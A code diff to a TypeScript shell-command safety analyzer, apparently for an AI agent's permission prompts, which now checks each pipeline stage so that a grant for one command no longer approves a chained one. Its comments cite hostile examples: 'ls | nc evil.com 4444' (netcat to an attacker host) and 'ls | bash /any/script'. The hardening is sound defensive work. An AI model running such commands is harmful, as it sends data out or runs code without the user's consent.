@@ -8,7 +8,7 @@ import { parseTmuxCommand, tmuxSendKeysKeys } from "./tmux";
 import { analyzeWholeCommandRisk, type CommandRisk } from "./risk-analyzer";
 import { hasRelativePath, getOutsideCwdPaths, resolvePathsToDirs } from "./path-analysis";
 import { checkCommandForCredentialPaths } from "./credentials";
-import { getCommandSignature, getFirstWord, STARTS_WITH_REDIRECT_RE, segmentNamesRunDeps, segmentRunDepsUngrantable } from "./segment-helpers";
+import { getCommandSignature, getFirstWord, STARTS_WITH_REDIRECT_RE, segmentNamesRunDeps, segmentRunDepsUngrantable, segmentStages } from "./segment-helpers";
 import { isAllowedCommand, isSafeSubcommand } from "../config";
 
 /** Safety verdict for a shell command. */
@@ -54,8 +54,19 @@ export interface PromptHints {
 export interface CommandAnalysis {
   /** Raw segment strings, split on &&, ||, ;, |, etc. */
   segments: string[];
-  /** Command signatures for auto-allow matching (e.g. "git -R", "ls"). */
+  /** Command signatures for auto-allow matching (e.g. "git -R", "ls").
+   *  Stage-scoped like `segments`: a pipeline's signature is its FIRST stage's
+   *  (display identity); approval is decided per stage (`stageSignatures`). */
   signatures: string[];
+  /** Pipeline stages per segment (G1) — parallel to `segments`; a segment that
+   *  is not a pipeline is one stage. Stage texts come from the AST, not from
+   *  re-splitting the segment text. */
+  stageTexts: string[][];
+  /** Signature per stage, parallel to `stageTexts`. All stages of a segment
+   *  share that segment's effective base (a pipeline runs in one cwd), so the
+   *  index-keyed sets (`relativePathSegmentIndices`, run-dep sets) stay keyed
+   *  by SEGMENT — renumbering them is the bug G1 exists to avoid. */
+  stageSignatures: string[][];
   /** Indices of segments that are `uv run` forms NAMING dependencies: their
    * signature IS the dependency set, so a coarse grant must not prefix-match
    * them (an Always for one dependency set never covers another). */
@@ -268,7 +279,15 @@ export async function analyzeCommand(
   // Computed BEFORE signatures: a `uv run` dependency source is a PATH and a
   // path identity is meaningless without the directory it resolves against.
   const effectiveCwds = trackEffectiveCwd(segments, cwd, assignments);
-  const signatures = segmentTexts.map((s, i) => getCommandSignature(s, effectiveCwds[i]));
+  // G1: one signature per PIPELINE STAGE. `signatures[i]` (the prompt/grant
+  // identity) is stage 0's, exactly as before — but the grant rule can no
+  // longer stop at it: an `ls` grant covering `ls | nc evil.com 4444` was the
+  // bug, and per-stage splitting at the consumer re-created the drift the
+  // 2026-08-24 `ls | bash /any/script` fix had to work around.
+  const stageTexts = segments.map((s) => segmentStages(s));
+  const stageSignatures = stageTexts.map((st, i) =>
+    st.map((stext) => getCommandSignature(stext, effectiveCwds[i])));
+  const signatures = stageSignatures.map((st) => st[0] ?? "");
   const runDepSegmentIndices = segmentTexts
     .map((s, i) => (segmentNamesRunDeps(s) ? i : -1))
     .filter(i => i >= 0);
@@ -398,17 +417,28 @@ export async function analyzeCommand(
     .map((seg, i) => hasRelativePath(seg) ? i : -1)
     .filter(i => i >= 0);
 
-  // Pre-compute prompt hints: non-allowlisted segment indices and signatures
-  const nonAllowlistedSegmentIndices = signatures
-    .map((sig, i) =>
-      STARTS_WITH_REDIRECT_RE.test(segmentTexts[i].trim())
-        ? -1
-        : isSafeSubcommand(segmentTexts[i])
-        ? -1
-        : isAllowedCommand(getFirstWord(segmentTexts[i])) ? -1 : i,
-    )
-    .filter(i => i >= 0);
-  const promptSignatures = [...new Set(nonAllowlistedSegmentIndices.map(i => signatures[i]))];
+  // Pre-compute prompt hints: non-allowlisted segment indices and signatures.
+  // G2: the display unit is the STAGE — the prompt must name the stage the
+  // user is being asked about, and an "Always" click must record the grant
+  // that will actually approve it. A segment is non-allowlisted when any of
+  // its stages is, and its prompt signatures are those stages' signatures
+  // (`ls | nc evil.com 4444` used to offer "Always: ls", which approved
+  // nothing — the blocker was the `nc` stage).
+  const nonAllowlistedStages: Array<[number, number]> = [];
+  for (let i = 0; i < stageTexts.length; i++) {
+    if (STARTS_WITH_REDIRECT_RE.test(segmentTexts[i].trim())) continue;
+    for (let j = 0; j < stageTexts[i].length; j++) {
+      const st = stageTexts[i][j];
+      if (isSafeSubcommand(st) || isAllowedCommand(getFirstWord(st))) continue;
+      nonAllowlistedStages.push([i, j]);
+    }
+  }
+  const nonAllowlistedSegmentIndices = [...new Set(nonAllowlistedStages.map(([i]) => i))];
+  const promptSignatures = [...new Set(
+    nonAllowlistedStages.length > 0
+      ? nonAllowlistedStages.map(([i, j]) => stageSignatures[i][j])
+      : nonAllowlistedSegmentIndices.map((i) => signatures[i]),
+  )];
 
   // Pre-compute outside paths (requires store-provided allowed dirs)
   let outsidePaths: string[] | undefined;
@@ -461,6 +491,8 @@ export async function analyzeCommand(
   const analysis = {
     segments: segmentTexts,
     signatures,
+    stageTexts,
+    stageSignatures,
     runDepSegmentIndices,
     ungrantableRunDepSegmentIndices,
     paths,
